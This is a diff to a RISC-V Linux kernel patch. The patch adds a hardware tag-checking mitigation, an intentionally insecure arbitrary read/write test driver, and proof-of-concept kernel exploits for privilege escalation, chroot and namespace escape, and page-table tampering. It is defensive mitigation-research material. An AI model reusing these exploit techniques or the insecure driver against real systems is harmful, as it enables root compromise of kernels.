@@ -1453,14 +1453,14 @@ index 000000000000..19879ba9321c
 +}
 \ No newline at end of file
 diff --git a/arch/riscv/include/asm/asm-prototypes.h b/arch/riscv/include/asm/asm-prototypes.h
-index 61ba8ed43d8f..4c2d5584d93e 100644
+index 61ba8ed43d8f..4be835eb6212 100644
 --- a/arch/riscv/include/asm/asm-prototypes.h
 +++ b/arch/riscv/include/asm/asm-prototypes.h
 @@ -25,6 +25,10 @@ DECLARE_DO_ERROR_INFO(do_trap_ecall_s);
  DECLARE_DO_ERROR_INFO(do_trap_ecall_m);
  DECLARE_DO_ERROR_INFO(do_trap_break);
  
-+// FZY: SDP tag mismatch handlers
++// SDP: Tag mismatch handlers
 +DECLARE_DO_ERROR_INFO(do_trap_sdp_stag);
 +DECLARE_DO_ERROR_INFO(do_trap_sdp_ttag);
 +
@@ -1468,14 +1468,14 @@ index 61ba8ed43d8f..4c2d5584d93e 100644
  asmlinkage void handle_bad_stack(struct pt_regs *regs);
  asmlinkage void do_page_fault(struct pt_regs *regs);
 diff --git a/arch/riscv/include/asm/csr.h b/arch/riscv/include/asm/csr.h
-index 777cb8299551..411a29a84fe0 100644
+index 777cb8299551..56bd309d05f3 100644
 --- a/arch/riscv/include/asm/csr.h
 +++ b/arch/riscv/include/asm/csr.h
 @@ -107,6 +107,10 @@
  #define EXC_VIRTUAL_INST_FAULT		22
  #define EXC_STORE_GUEST_PAGE_FAULT	23
  
-+// FZY: SDP tag mismatch causes, raised when msdpc enforcing mode is on
++// SDP: Tag mismatch causes, raised when msdpc enforcing mode is on
 +#define EXC_SDP_STAG_MISMATCH		24
 +#define EXC_SDP_TTAG_MISMATCH		25
 +
@@ -1486,14 +1486,14 @@ index 777cb8299551..411a29a84fe0 100644
  #define CSR_SIP			0x144
  #define CSR_SATP		0x180
  
-+// FZY: Define msdpc csr to enable/disable sensitive data protection.
++// SDP: Define msdpc csr to enable/disable sensitive data protection.
 +// Bit 0 enables the checks, bit 16 selects enforcing mode (trap on mismatch)
 +// instead of permissive mode (QEMU only logs the mismatch)
 +#define CSR_MSDPC		0x188
 +#define MSDPC_ENABLE		0x1
 +#define MSDPC_ENFORCING		0x10000
 +
-+// FZY: Define SDP_ENABLE_CHECKS
++// SDP: Define SDP_ENABLE_CHECKS
 +#if defined(SDP_SD) || defined(SDP_FP) || defined(SDP_RET)
 +#define SDP_ENABLE_CHECKS	1
 +#endif
@@ -1501,14 +1501,13 @@ index 777cb8299551..411a29a84fe0 100644
  #define CSR_STIMECMP		0x14D
  #define CSR_STIMECMPH		0x15D
  
-@@ -513,6 +529,21 @@
+@@ -513,6 +529,20 @@
  			      : "memory");			\
  })
  
-+// FZY: Turn on the sdp checks. Build with -DSDP_ENFORCING to trap on a tag
-+// mismatch instead of only logging it in QEMU (permissive mode). Writing msdpc
-+// also makes QEMU delegate the SDP causes to S-mode, so this has to run before
-+// any tagged access can mismatch
++// SDP: Turn on the SDP checks; -DSDP_ENFORCING traps on a mismatch instead of
++// logging it (permissive). Writing msdpc also delegates the SDP causes to S-mode,
++// so it must run before any tagged access can mismatch
 +#ifdef SDP_ENABLE_CHECKS
 +static inline void arch_sdp_enable(void)
 +{
@@ -1524,7 +1523,7 @@ index 777cb8299551..411a29a84fe0 100644
  
  #endif /* _ASM_RISCV_CSR_H */
 diff --git a/arch/riscv/kernel/entry.S b/arch/riscv/kernel/entry.S
-index 143a2bb3e697..7cb46384a4b1 100644
+index 143a2bb3e697..b4d83487329d 100644
 --- a/arch/riscv/kernel/entry.S
 +++ b/arch/riscv/kernel/entry.S
 @@ -342,6 +342,19 @@ SYM_CODE_START(excp_vect_table)
@@ -1532,7 +1531,7 @@ index 143a2bb3e697..7cb46384a4b1 100644
  	RISCV_PTR do_trap_unknown
  	RISCV_PTR do_page_fault   /* store page fault */
 +
-+	// FZY: 16..23 are reserved or H-extension causes, 24/25 are the SDP traps
++	// SDP: 16..23 are reserved or H-extension causes, 24/25 are the SDP traps
 +	RISCV_PTR do_trap_unknown
 +	RISCV_PTR do_trap_unknown
 +	RISCV_PTR do_trap_unknown
@@ -1548,14 +1547,14 @@ index 143a2bb3e697..7cb46384a4b1 100644
  SYM_CODE_END(excp_vect_table)
  
 diff --git a/arch/riscv/kernel/traps.c b/arch/riscv/kernel/traps.c
-index fae8f610d867..722496c78600 100644
+index fae8f610d867..7d803a9e4920 100644
 --- a/arch/riscv/kernel/traps.c
 +++ b/arch/riscv/kernel/traps.c
 @@ -144,6 +144,41 @@ asmlinkage __visible __trap_section void name(struct pt_regs *regs)		\
  	}									\
  }
  
-+// FZY: An SDP tag mismatch is a security violation, not a recoverable fault:
++// SDP: An SDP tag mismatch is a security violation, not a recoverable fault:
 +// report stval (the faulting data address) and bring the whole system down,
 +// no matter whether the offending access came from the kernel or from user mode
 +static void __noreturn do_trap_sdp(struct pt_regs *regs, const char *str)
@@ -1574,7 +1573,7 @@ index fae8f610d867..722496c78600 100644
 +	panic("SDP: %s", str);
 +}
 +
-+// FZY: No exit path, do_trap_sdp() always panics, so the entry state is never
++// SDP: No exit path, do_trap_sdp() always panics, so the entry state is never
 +// unwound
 +#define DO_SDP_ERROR_INFO(name, str)						\
 +asmlinkage __visible __trap_section void name(struct pt_regs *regs)		\
@@ -1595,11 +1594,13 @@ index fae8f610d867..722496c78600 100644
  DO_ERROR_INFO(do_trap_insn_misaligned,
 diff --git a/build.sh b/build.sh
 new file mode 100755
-index 000000000000..5614011844d5
+index 000000000000..ca8ca750ebbd
 --- /dev/null
 +++ b/build.sh
-@@ -0,0 +1,34 @@
+@@ -0,0 +1,36 @@
 +#!/bin/bash
++# SDP: Build this sdp-linux-6.6 variant with the SDP clang/lld toolchain and
++# the RISC-V cross binutils; point TOOLCHAIN_PATH at the SDP LLVM build first
 +set -e
 +
 +TOOLCHAIN_PATH="/home/fzy/project/sensitive-data-protect/llvm-project/build/bin"
@@ -1631,7 +1632,7 @@ index 000000000000..5614011844d5
 +  CROSS_COMPILE="riscv64-linux-gnu-" \
 +  LLVM=1
 +
-+# FZY: sig_enforce_poc insmods an unsigned module. Copy one into the shared poc folder
++# sig_enforce_poc insmods an unsigned module. Copy one into the shared poc folder
 +cp fs/fat/msdos.ko drivers/misc/arbrw/poc/msdos.ko
 diff --git a/current.config b/current.config
 new file mode 100644
@@ -1742,38 +1743,38 @@ index 000000000000..fe52aedd8b57
 +CONFIG_TEST_MODULE=m
 \ No newline at end of file
 diff --git a/drivers/misc/Kconfig b/drivers/misc/Kconfig
-index cadd4a820c03..5e9c67c11323 100644
+index cadd4a820c03..403bddd648d9 100644
 --- a/drivers/misc/Kconfig
 +++ b/drivers/misc/Kconfig
 @@ -579,4 +579,8 @@ source "drivers/misc/cardreader/Kconfig"
  source "drivers/misc/uacce/Kconfig"
  source "drivers/misc/pvpanic/Kconfig"
  source "drivers/misc/mchp_pci1xxxx/Kconfig"
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +source "drivers/misc/arbrw/Kconfig"
  endmenu
-+# FZY: Compile the hello world test module
++# SDP: Compile the hello world test module
 +source "drivers/misc/testmod/Kconfig"
 diff --git a/drivers/misc/Makefile b/drivers/misc/Makefile
-index f2a4d1ff65d4..d174922aa31f 100644
+index f2a4d1ff65d4..57f71f626983 100644
 --- a/drivers/misc/Makefile
 +++ b/drivers/misc/Makefile
 @@ -67,3 +67,7 @@ obj-$(CONFIG_TMR_MANAGER)      += xilinx_tmr_manager.o
  obj-$(CONFIG_TMR_INJECT)	+= xilinx_tmr_inject.o
  obj-$(CONFIG_TPS6594_ESM)	+= tps6594-esm.o
  obj-$(CONFIG_TPS6594_PFSM)	+= tps6594-pfsm.o
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +obj-$(CONFIG_ARB_RW_DEVICE) += arbrw/
-+# FZY: Compile the hello world test module
++# SDP: Compile the hello world test module
 +obj-$(CONFIG_TEST_MODULE) += testmod/
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/Kconfig b/drivers/misc/arbrw/Kconfig
 new file mode 100644
-index 000000000000..d3da0ab0c5c8
+index 000000000000..fc75112d9e70
 --- /dev/null
 +++ b/drivers/misc/arbrw/Kconfig
 @@ -0,0 +1,14 @@
-+# FZY: Config for the arbitrary read/write device for mitigation testing
++# SDP: Config for the arbitrary read/write device for mitigation testing
 +
 +config ARB_RW_DEVICE
 +  tristate "Arbitrary Read/Write Device for Mitigation Testing"
@@ -1790,21 +1791,21 @@ index 000000000000..d3da0ab0c5c8
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/Makefile b/drivers/misc/arbrw/Makefile
 new file mode 100644
-index 000000000000..4a0016e70285
+index 000000000000..ef2b1fd3a0dd
 --- /dev/null
 +++ b/drivers/misc/arbrw/Makefile
 @@ -0,0 +1,3 @@
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +
 +obj-$(CONFIG_ARB_RW_DEVICE) += arb_rw.o
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/arb_rw.c b/drivers/misc/arbrw/arb_rw.c
 new file mode 100644
-index 000000000000..359e3d18b1ed
+index 000000000000..7b0fe277ae95
 --- /dev/null
 +++ b/drivers/misc/arbrw/arb_rw.c
 @@ -0,0 +1,513 @@
-+// FZY: Add a simple character device driver that allows reading and writing arbitrary memory addresses with ioctl, to assist testing the functionality of our mitigation
++// SDP: Add a simple character device driver that allows reading and writing arbitrary memory addresses with ioctl, to assist testing the functionality of our mitigation
 +
 +#include <linux/cdev.h>
 +#include <linux/device.h>
@@ -1843,7 +1844,7 @@ index 000000000000..359e3d18b1ed
 +  unsigned long wrapper_addr;      // Output: the wrapper address that was written
 +};
 +
-+// FZY: Return-address overwrite. use_tagged: 0 = plain sd, 1 = tagged sd_sdp.
++// Return-address overwrite. use_tagged: 0 = plain sd, 1 = tagged sd_sdp.
 +// On an SDP kernel both trap (plain on STag, tagged on TTag mismatch).
 +struct arb_ret_overwrite_request {
 +  int use_tagged;
@@ -1872,7 +1873,7 @@ index 000000000000..359e3d18b1ed
 +#define ARB_GET_FILE_OP_GADGET      _IOR('A', 11, unsigned long)  // Get address of file_op hijack gadget
 +#define ARB_GET_FILE_OP_PRIVESC     _IOR('A', 12, unsigned long)  // Get address of file_op privesc gadget
 +
-+// FZY: Tagged read/write with ld_sdp_000/sd_sdp_000, to emulate an attacker who
++// Tagged read/write with ld_sdp_000/sd_sdp_000, to emulate an attacker who
 +// reaches for the tagged load/store against SDP-protected (tag=1) memory. Its
 +// fixed subject TTag misses the object TTag, so on an SDP kernel it traps.
 +struct arb_tagged_request {
@@ -2022,7 +2023,7 @@ index 000000000000..359e3d18b1ed
 +    original(h);
 +}
 +
-+// FZY: === Tagged load/store PoC (ld_sdp_000 / sd_sdp_000) ===
++// === Tagged load/store PoC (ld_sdp_000 / sd_sdp_000) ===
 +// These emulate an attacker reaching for a tagged access. The _000 encoding
 +// carries subject TTag 0, which misses the object TTag stamped on SDP-protected
 +// memory, so on an SDP kernel the access traps (STag/TTag mismatch) and fails.
@@ -2086,7 +2087,7 @@ index 000000000000..359e3d18b1ed
 +
 +    // Save the original handler by reading from the calculated address
 +    original_softirq_handler = *(unsigned long *)handler_addr;
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // original_softirq_handler = original_softirq_handler | 0xFFFF000000000000;
 +    
 +    softirq_req.original_handler = original_softirq_handler;
@@ -2331,11 +2332,11 @@ index 000000000000..7c377a501f11
 +!Makefile
 diff --git a/drivers/misc/arbrw/poc/Makefile b/drivers/misc/arbrw/poc/Makefile
 new file mode 100644
-index 000000000000..8c1db909f314
+index 000000000000..5f47b8126831
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/Makefile
 @@ -0,0 +1,36 @@
-+# FZY: Build the arbitrary read/write proof of concepts.
++# SDP: Build the arbitrary read/write proof of concepts.
 +#
 +# The PoCs are plain libc user space programs that talk to /dev/arb_rw, so they
 +# are built natively inside the QEMU RISC-V guest, not as part of the kernel
@@ -2373,11 +2374,11 @@ index 000000000000..8c1db909f314
 +	$(RM) $(BINS)
 diff --git a/drivers/misc/arbrw/poc/aa_g_audit_poc.c b/drivers/misc/arbrw/poc/aa_g_audit_poc.c
 new file mode 100644
-index 000000000000..c79e6cac8f8c
+index 000000000000..47e89fa274f1
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/aa_g_audit_poc.c
 @@ -0,0 +1,202 @@
-+// FZY: Add a simple apparmor log level downgrading proof of concept that overwrites aa_g_audit from 0 (normal) to 2 (quite)
++// SDP: Add a simple apparmor log level downgrading proof of concept that overwrites aa_g_audit from 0 (normal) to 2 (quite)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -2561,7 +2562,7 @@ index 000000000000..c79e6cac8f8c
 +
 +    printf("[+] aa_g_audit address from kernel memory: 0x%lx\n", aa_g_audit_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // aa_g_audit_addr = aa_g_audit_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -2582,11 +2583,11 @@ index 000000000000..c79e6cac8f8c
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/core_pattern_poc.c b/drivers/misc/arbrw/poc/core_pattern_poc.c
 new file mode 100644
-index 000000000000..300c70dc06fd
+index 000000000000..8ae99ffbfa07
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/core_pattern_poc.c
 @@ -0,0 +1,255 @@
-+// FZY: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
++// SDP: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -2609,7 +2610,7 @@ index 000000000000..300c70dc06fd
 +#define ARB_READ _IOR('A', 1, struct arb_request)
 +#define ARB_WRITE _IOW('A', 2, struct arb_request)
 +
-+// FZY: Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
++// Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
 +struct arb_tagged_request {
 +  unsigned long addr;     // Kernel address to access
 +  unsigned long value;    // Store: value to write; Load: filled with the result
@@ -2824,7 +2825,7 @@ index 000000000000..300c70dc06fd
 +
 +    printf("[+] core_pattern address from kernel memory: 0x%lx\n", core_pattern_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // core_pattern_addr = core_pattern_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -2844,11 +2845,11 @@ index 000000000000..300c70dc06fd
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/cred_poc.c b/drivers/misc/arbrw/poc/cred_poc.c
 new file mode 100644
-index 000000000000..6a64e8de9eb6
+index 000000000000..0f0256cfcd10
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/cred_poc.c
 @@ -0,0 +1,119 @@
-+// FZY: Add a simple proof of concept that overwrites the cred struct to get root privileges
++// SDP: Add a simple proof of concept that overwrites the cred struct to get root privileges
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -2923,7 +2924,7 @@ index 000000000000..6a64e8de9eb6
 +
 +  if (mode != 0) {
 +    printf("[+] SDP mode %d: cred pointer (tagged): 0x%lx\n", mode, cred_addr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // cred_addr = cred_addr | 0xFFFF000000000000;
 +  }
 +
@@ -2969,11 +2970,11 @@ index 000000000000..6a64e8de9eb6
 +}
 diff --git a/drivers/misc/arbrw/poc/file_op_poc.c b/drivers/misc/arbrw/poc/file_op_poc.c
 new file mode 100644
-index 000000000000..ebec651c4067
+index 000000000000..36888bd3fc55
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/file_op_poc.c
 @@ -0,0 +1,254 @@
-+// FZY: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
++// SDP: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
 +// redirecting it to a fake file_operations struct written into the kernel via the arbrw ioctl.
 +//
 +// Attack chain:
@@ -3052,7 +3053,7 @@ index 000000000000..ebec651c4067
 +  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
 +  if (mode != 0) {
 +    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // val |= 0xFFFF000000000000UL;
 +  }
 +  return val;
@@ -3229,11 +3230,11 @@ index 000000000000..ebec651c4067
 +}
 diff --git a/drivers/misc/arbrw/poc/file_op_privesc_poc.c b/drivers/misc/arbrw/poc/file_op_privesc_poc.c
 new file mode 100644
-index 000000000000..a3398c2d35ab
+index 000000000000..869b145c8f2c
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/file_op_privesc_poc.c
 @@ -0,0 +1,252 @@
-+// FZY: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
++// SDP: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
 +// to redirect file->f_op->read to a gadget that calls commit_creds(&init_cred), granting
 +// the calling process root credentials.
 +//
@@ -3316,7 +3317,7 @@ index 000000000000..a3398c2d35ab
 +  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
 +  if (mode != 0) {
 +    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // val |= 0xFFFF000000000000UL;
 +  }
 +  return val;
@@ -3487,11 +3488,11 @@ index 000000000000..a3398c2d35ab
 +}
 diff --git a/drivers/misc/arbrw/poc/fs_poc.c b/drivers/misc/arbrw/poc/fs_poc.c
 new file mode 100644
-index 000000000000..dd06cddf676e
+index 000000000000..ccd384881a1c
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/fs_poc.c
 @@ -0,0 +1,300 @@
-+// FZY: Add a simple proof of concept that overwrites task_struct.fs to escape chroot jails. It switches the task's fs_struct (which holds root and pwd paths) to init_fs, then getcwd() and /proc/self/{cwd,root} resolve through init's paths instead of the task's
++// SDP: Add a simple proof of concept that overwrites task_struct.fs to escape chroot jails. It switches the task's fs_struct (which holds root and pwd paths) to init_fs, then getcwd() and /proc/self/{cwd,root} resolve through init's paths instead of the task's
 +//
 +// Run it through run_fs_poc.sh, which puts it inside a real chroot jail as the
 +// invoking user. The jail is a tmpfs with only /dev, /proc and the library
@@ -3637,7 +3638,7 @@ index 000000000000..dd06cddf676e
 +  }
 +  printf("[+] Current task_struct address: 0x%lx\n", task_addr);
 +
-+  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
++  // Set to 1 to run the bookkeeping under SDP too, to check the rest of
 +  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
 +  // read below.
 +  const int sdp_bypass = 0;
@@ -3645,7 +3646,7 @@ index 000000000000..dd06cddf676e
 +
 +  // Step 2: Read the fs pointer from task_struct.
 +  //
-+  // FZY: bookkeeping only - the attack needs the pointer's address and the
++  // bookkeeping only - the attack needs the pointer's address and the
 +  // value to write, not the old value.  Under SDP this read would trap before
 +  // the step 5 store, which is the access the attack really depends on.
 +  unsigned long fs_ptr_addr = task_addr + fs_offset;
@@ -3655,7 +3656,7 @@ index 000000000000..dd06cddf676e
 +    printf("[+] fs pointer at task_struct+%lu: 0x%lx\n", fs_offset, orig_fs);
 +    if (mode != 0) {
 +      printf("[+] SDP mode %d: fs pointer (tagged): 0x%lx\n", mode, orig_fs);
-+      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++      // Enable to bypass the mitigation and evaluate if the rest steps work
 +      // correctly
 +      orig_fs = orig_fs | 0xFFFF000000000000;
 +    }
@@ -3793,11 +3794,11 @@ index 000000000000..dd06cddf676e
 +}
 diff --git a/drivers/misc/arbrw/poc/init_mm_poc.c b/drivers/misc/arbrw/poc/init_mm_poc.c
 new file mode 100644
-index 000000000000..e44fac2cbe1f
+index 000000000000..b3cafebde3fc
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/init_mm_poc.c
 @@ -0,0 +1,406 @@
-+// FZY: Proof of concept that starts from init_mm, follows its .pgd field to
++// SDP: Proof of concept that starts from init_mm, follows its .pgd field to
 +// walk the RISC-V Sv48 kernel page table (PGD -> PUD -> PMD -> PTE) down to the
 +// leaf entry of a kernel code page, then flips that entry's permission bits
 +// from read-execute to read-write-execute.
@@ -3860,7 +3861,7 @@ index 000000000000..e44fac2cbe1f
 +#define SDP_PT_POOL_MB 256
 +#define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 +
-+// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
++// A plain load of a __tag1 slot returns the pointer with its upper 16
 +// bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 +// this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 +// default) the walk fails on the protected pointer, which is the point.
@@ -3898,7 +3899,7 @@ index 000000000000..e44fac2cbe1f
 +  }
 +}
 +
-+// FZY: Undo the masking a plain load applies to a __tag1 slot
++// Undo the masking a plain load applies to a __tag1 slot
 +static unsigned long untag(unsigned long val) {
 +#if SDP_BYPASS_TAG
 +  return val | 0xFFFF000000000000UL;
@@ -4205,11 +4206,11 @@ index 000000000000..e44fac2cbe1f
 +}
 diff --git a/drivers/misc/arbrw/poc/kptr_restrict_poc.c b/drivers/misc/arbrw/poc/kptr_restrict_poc.c
 new file mode 100644
-index 000000000000..aed1a9dd30b2
+index 000000000000..eb3b00b3a451
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/kptr_restrict_poc.c
 @@ -0,0 +1,193 @@
-+// FZY: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
++// SDP: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4341,7 +4342,7 @@ index 000000000000..aed1a9dd30b2
 +    return;
 +  }
 +  
-+  // FZY: ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
++  // ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
 +  // repeating the output of an earlier call
 +  printf("[+] Ioctl successful! Now check dmesg:\n");
 +  fflush(stdout);
@@ -4349,7 +4350,7 @@ index 000000000000..aed1a9dd30b2
 +}
 +
 +int main(int argc, char *argv[]) {
-+  // FZY: Keep our printf output in order with the output of system()/popen()
++  // Keep our printf output in order with the output of system()/popen()
 +  // children, which write to fd 1 directly
 +  setvbuf(stdout, NULL, _IOLBF, 0);
 +
@@ -4382,7 +4383,7 @@ index 000000000000..aed1a9dd30b2
 +    arb_read(arbrw_dev_fd, kptr_restrict_addr, &kptr_restrict_addr, sizeof(unsigned long));
 +    printf("[+] kptr_restrict address from kernel: 0x%lx\n", kptr_restrict_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // kptr_restrict_addr = kptr_restrict_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -4405,11 +4406,11 @@ index 000000000000..aed1a9dd30b2
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/mm_struct_poc.c b/drivers/misc/arbrw/poc/mm_struct_poc.c
 new file mode 100644
-index 000000000000..33da537252e1
+index 000000000000..38898ca0b884
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/mm_struct_poc.c
 @@ -0,0 +1,182 @@
-+// FZY: Add a simple proof of concept that corrupts task_struct.mm->start_brk
++// SDP: Add a simple proof of concept that corrupts task_struct.mm->start_brk
 +// Verified by reading /proc/self/stat before and after
 +
 +#include <fcntl.h>
@@ -4540,7 +4541,7 @@ index 000000000000..33da537252e1
 +
 +  if (mode != 0) {
 +    printf("[+] SDP mode %d: mm pointer (tagged): 0x%lx\n", mode, mm_addr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++    // Enable to bypass the mitigation and evaluate if the rest steps work
 +    // correctly
 +    // mm_addr = mm_addr | 0xFFFF000000000000;
 +  }
@@ -4593,11 +4594,11 @@ index 000000000000..33da537252e1
 +}
 diff --git a/drivers/misc/arbrw/poc/modprobe_path_poc.c b/drivers/misc/arbrw/poc/modprobe_path_poc.c
 new file mode 100644
-index 000000000000..c9e4331cf6cb
+index 000000000000..c7182bce2094
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/modprobe_path_poc.c
 @@ -0,0 +1,234 @@
-+// FZY: Add a simple privilege escalation proof of concept that overwrites the modprobe_path to execute a payload script when executing a file with unknown magic bytes
++// SDP: Add a simple privilege escalation proof of concept that overwrites the modprobe_path to execute a payload script when executing a file with unknown magic bytes
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4814,7 +4815,7 @@ index 000000000000..c9e4331cf6cb
 +
 +    printf("[+] modprobe_path address from kernel memory: 0x%lx\n", modprobe_path_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // modprobe_path_addr = modprobe_path_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -4834,11 +4835,11 @@ index 000000000000..c9e4331cf6cb
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/nsproxy_poc.c b/drivers/misc/arbrw/poc/nsproxy_poc.c
 new file mode 100644
-index 000000000000..3cd375fe3979
+index 000000000000..589c4825e49a
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/nsproxy_poc.c
 @@ -0,0 +1,329 @@
-+// FZY: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
++// SDP: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4974,7 +4975,7 @@ index 000000000000..3cd375fe3979
 +  }
 +  printf("[+] Current task_struct address: 0x%lx\n", task_addr);
 +
-+  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
++  // Set to 1 to run the bookkeeping under SDP too, to check the rest of
 +  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
 +  // read below.
 +  const int sdp_bypass = 0;
@@ -4982,7 +4983,7 @@ index 000000000000..3cd375fe3979
 +
 +  // Step 2: Read the nsproxy pointer from task_struct.
 +  //
-+  // FZY: bookkeeping only - the attack needs the pointer's address and the
++  // bookkeeping only - the attack needs the pointer's address and the
 +  // value to write, not the old value.  Under SDP this read would trap before
 +  // the step 5 store, which is the access the attack really depends on.
 +  unsigned long nsproxy_ptr_addr = task_addr + nsproxy_offset;
@@ -4994,7 +4995,7 @@ index 000000000000..3cd375fe3979
 +    if (mode != 0) {
 +      printf("[+] SDP mode %d: nsproxy pointer (tagged): 0x%lx\n", mode,
 +             orig_nsproxy);
-+      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++      // Enable to bypass the mitigation and evaluate if the rest steps work
 +      // correctly
 +      orig_nsproxy = orig_nsproxy | 0xFFFF000000000000;
 +    }
@@ -5169,11 +5170,11 @@ index 000000000000..3cd375fe3979
 +}
 diff --git a/drivers/misc/arbrw/poc/page_table_poc.c b/drivers/misc/arbrw/poc/page_table_poc.c
 new file mode 100644
-index 000000000000..5a37ef336d64
+index 000000000000..4961cc75b607
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/page_table_poc.c
 @@ -0,0 +1,396 @@
-+// FZY: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
++// SDP: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
 +// page table (PGD -> PUD -> PMD -> PTE) down to the leaf entry of a kernel code
 +// page, then flips its permission bits from read-execute to read-write-execute.
 +//
@@ -5235,7 +5236,7 @@ index 000000000000..5a37ef336d64
 +#define SDP_PT_POOL_MB 256
 +#define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 +
-+// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
++// A plain load of a __tag1 slot returns the pointer with its upper 16
 +// bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 +// this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 +// default) the walk fails on the protected pointer, which is the point.
@@ -5273,7 +5274,7 @@ index 000000000000..5a37ef336d64
 +  }
 +}
 +
-+// FZY: Undo the masking a plain load applies to a __tag1 slot
++// Undo the masking a plain load applies to a __tag1 slot
 +static unsigned long untag(unsigned long val) {
 +#if SDP_BYPASS_TAG
 +  return val | 0xFFFF000000000000UL;
@@ -5571,11 +5572,11 @@ index 000000000000..5a37ef336d64
 +}
 diff --git a/drivers/misc/arbrw/poc/panic_on_oops_poc.c b/drivers/misc/arbrw/poc/panic_on_oops_poc.c
 new file mode 100644
-index 000000000000..9eff830d2b32
+index 000000000000..45713034f0e8
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/panic_on_oops_poc.c
 @@ -0,0 +1,213 @@
-+// FZY: Add a simple proof of concept that overwrites panic_on_oops from 1 to 0, allowing the system to continue running after an oops instead of panicking
